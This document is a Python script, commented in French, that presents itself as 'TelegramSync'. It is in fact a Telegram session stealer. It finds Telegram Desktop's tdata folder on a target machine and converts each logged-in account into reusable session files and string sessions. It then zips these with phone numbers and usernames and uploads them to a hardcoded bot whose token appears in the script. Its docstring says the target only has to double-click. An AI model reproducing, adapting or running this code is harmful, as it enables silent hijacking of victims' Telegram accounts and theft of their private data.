# -*- coding: utf-8 -*-
"""
TelegramSync - tdata -> .session par compte -> envoi vers ton bot Telegram.
Aucune interaction requise cote cible (hors double-clic).
"""
import os, sys, json, shutil, asyncio, zipfile, tempfile, traceback
import requests

# ---------------------------------------------------------------- CONFIG
BOT_TOKEN = "8710535929:AAE8JvCbRXQ4wkrsVeKwl3yKhBmhsbxfxPA"
CHAT_ID   = 8425878739

# api_id/api_hash de Telegram Desktop : deterministes, a reutiliser chez toi
API_ID   = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
# ----------------------------------------------------------------------

WORK = os.path.join(tempfile.gettempdir(), "tgsync")


# ------------------------------------------------------------- feedback UI
def popup(title, msg):
    try:
        import tkinter.messagebox as mb
        mb.showinfo(title, msg)
    except Exception:
        pass


# ------------------------------------------------------------- bot helpers
def tg_call(method, **kw):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    r = requests.post(url, timeout=600, **kw)
    r.raise_for_status()
    return r.json()


def tg_text(text):
    try:
        tg_call("sendMessage", data={"chat_id": CHAT_ID, "text": text[:4000]})
    except Exception:
        pass


def tg_file(path, caption=""):
    with open(path, "rb") as fh:
        tg_call("sendDocument",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"document": fh})


def tg_big(path, caption="", limit=45 * 1024 * 1024):
    """La Bot API plafonne les documents a 50 Mo -> decoupage en parts."""
    if os.path.getsize(path) <= limit:
        tg_file(path, caption)
        return
    with open(path, "rb") as fh:
        i = 0
        while True:
            chunk = fh.read(limit)
            if not chunk:
                break
            part = f"{path}.part{i:02d}"
            with open(part, "wb") as o:
                o.write(chunk)
            tg_file(part, f"{caption} [part {i:02d}]")
            os.remove(part)
            i += 1


# ------------------------------------------------------------- tdata
def find_tdata():
    cands = [
        os.path.expandvars(r"%APPDATA%\Telegram Desktop\tdata"),
        os.path.expandvars(r"%LOCALAPPDATA%\Telegram Desktop\tdata"),
        os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "tdata"),
    ]
    for c in cands:
        if os.path.isdir(c) and os.path.isfile(os.path.join(c, "key_datas")):
            return c
    for c in cands:
        if os.path.isdir(c):
            return c
    return None


def zip_dir(src, dst):
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(src):
            for f in files:
                p = os.path.join(root, f)
                z.write(p, os.path.relpath(p, src))


# ------------------------------------------------------------- conversion
async def convert_all(tdata, outdir):
    from opentele.td import TDesktop
    from opentele.api import API, UseCurrentSession
    from telethon.sessions import StringSession

    td = TDesktop(tdata)
    if not td.isLoaded():
        raise RuntimeError("tdata illisible (key_datas manquant ou corrompu)")

    n = len(td.accounts)
    tg_text(f"tdata localise, {n} compte(s) detecte(s). Conversion en cours...")

    out = []
    for i, acc in enumerate(td.accounts):
        entry = {"index": i}
        try:
            client = await acc.ToTelethon(
                session=os.path.join(outdir, f"account_{i}"),
                flag=UseCurrentSession,          # reutilise l'auth existante
                api=API.TelegramDesktop,
            )
            await client.connect()
            if not await client.is_user_authorized():
                raise RuntimeError("session non autorisee")
            me = await client.get_me()
            entry.update({
                "file": f"account_{i}.session",
                "id": me.id,
                "phone": me.phone,
                "username": me.username,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "dc_id": client.session.dc_id,
                "string_session": StringSession.save(client.session),
            })
            await client.disconnect()
        except Exception as e:
            entry["error"] = repr(e)
        out.append(entry)
    return out


# ------------------------------------------------------------- main
def main():
    td = find_tdata()
    if not td:
        popup("TelegramSync",
              "Telegram Desktop introuvable.\n"
              "Installez-le, connectez-vous une fois, puis relancez.")
        return

    shutil.rmtree(WORK, ignore_errors=True)
    os.makedirs(WORK, exist_ok=True)

    accounts = asyncio.run(convert_all(td, WORK))
    if not accounts:
        raise RuntimeError("aucun compte converti")

    manifest = os.path.join(WORK, "manifest.json")
    with open(manifest, "w", encoding="utf-8") as f:
        json.dump(accounts, f, indent=2, ensure_ascii=False)

    z = os.path.join(tempfile.gettempdir(), "sessions.zip")
    zip_dir(WORK, z)

    ok = [a for a in accounts if "error" not in a]
    tg_big(z, f"session(s) Telegram - {len(ok)} compte(s) sur {len(accounts)}")
    tg_text("Comptes:\n" + "\n".join(
        f"- #{a['index']} {a.get('phone','?')} @{a.get('username') or '-'}"
        + (" [ECHEC]" if "error" in a else "")
        for a in accounts))

    popup("TelegramSync", f"Termine. {len(ok)} compte(s) envoye(s) sur ton bot.")


if __name__ == "__main__":
    try:
        main()
    except Exception:
        tb = traceback.format_exc()
        tg_text("TelegramSync - ERREUR\n\n" + tb)
        popup("TelegramSync", "Erreur. Details envoyes sur ton bot.")
